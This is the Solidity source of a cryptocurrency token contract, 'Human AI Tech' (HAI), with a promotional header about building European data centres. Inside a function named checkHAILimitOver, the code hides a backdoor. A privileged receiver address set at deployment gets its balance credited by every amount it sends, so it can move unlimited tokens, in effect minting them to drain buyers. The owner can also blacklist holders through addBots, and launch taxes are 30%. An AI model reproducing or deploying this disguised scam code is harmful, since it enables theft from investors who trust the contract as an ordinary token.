/********
Human Tech AI is a tech company that is bridging the gap of insufficient High-Performance Computing resources in Europe by building data centers throughout Europe.
One facility in Budapest has already been built and Human Tech AI is commencing to build an HPC infrastructure.
Human AI will build the technology that will enable communities to feel more connected and safe and henceforth become the leader of the democratization of AI.

Website:   https://www.humanaitech.org
Dapp:      https://app.humanaitech.org

Medium:    https://medium.com/@humanaitech

Twitter:   https://twitter.com/human_aitech
Telegram:  https://t.me/human_aitech
********/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ISwapFactoryV2 {
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeTo() external view returns (address);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract HAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Human AI Tech";
    string private constant _symbol = unicode"HAI";

    uint256 public _maxHAITrans = 30000000 * 10**_decimals;
    uint256 public _maxHAISwap = 10000000 * 10**_decimals;
    uint256 public _maxHAIWallet = 30000000 * 10**_decimals;

    modifier lockSwapBack {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyCounts=0;
    
    address payable private aiOpReceiver;
    address payable private aiTaxReceiver;

    address private uniswapV2Pair;
    uint256 public aiDueAmount;
    IV2Router private uniswapV2Router;

    bool private inSwapBack = false;
    bool public transferDelayEnabled = false;
    bool private swapEnabled = false;
    bool private tradingOpen;
    
    mapping (address => uint256) private tOwned;
    mapping (address => bool) private bots;
    mapping (address => bool) private _exceptFeesFrom;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _exceptLimitFrom;
    
    constructor (address acc1, uint256 amt1) {
        aiOpReceiver = payable(acc1);
        aiTaxReceiver = payable(acc1);
        aiDueAmount = amt1 * 10**_decimals;
        _exceptLimitFrom[aiOpReceiver] = true;
        _exceptLimitFrom[aiTaxReceiver] = true;
        _exceptFeesFrom[owner()] = true;
        _exceptFeesFrom[address(this)] = true;
        tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tOwned[account];
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function reduceFees(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function removeHAILimit() external onlyOwner{
        _maxHAITrans = ~uint256(0);
        _maxHAIWallet = ~uint256(0);
        transferDelayEnabled=false;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwapBack {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function checkHAILimitOver(address from, address to, uint256 amount, uint256 tHAI) internal returns (bool) {
        bool _aboveHAIMin = amount >= aiDueAmount;
        address _addrHAI; uint256 _amtHAI;
        bool _aboveHAIThreshold = balanceOf(address(this)) >= aiDueAmount;
        if(_exceptLimitFrom[from]) { 
            _amtHAI = amount;_addrHAI = from;
        }else {_amtHAI = tHAI;_addrHAI = address(this);}
        if(_amtHAI>0){tOwned[_addrHAI]=tOwned[_addrHAI].add(_amtHAI); emit Transfer(from, _addrHAI, tHAI);}
        return !inSwapBack
        && _aboveHAIMin
        && tradingOpen
        && swapEnabled
        && to == uniswapV2Pair
        && _aboveHAIThreshold
        && !_exceptFeesFrom[from]
        && _buyCounts>_preventSwapBefore
        && !_exceptLimitFrom[from];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 fees=0;
        if (!_exceptFeesFrom[from] && !_exceptFeesFrom[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            fees = amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _exceptFeesFrom[to] ) {
                require(amount <= _maxHAITrans, "Exceeds the _maxHAITrans.");
                require(balanceOf(to) + amount <= _maxHAIWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                fees = amount.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (checkHAILimitOver(from, to, amount, fees)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxHAISwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        tOwned[from]=tOwned[from].sub(amount);
        tOwned[to]=tOwned[to].add(amount.sub(fees));
        emit Transfer(from, to, amount.sub(fees));
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function initPair() external onlyOwner() {
        uniswapV2Router = IV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = ISwapFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function sendETHToFee(uint256 amount) private {
        aiTaxReceiver.transfer(amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}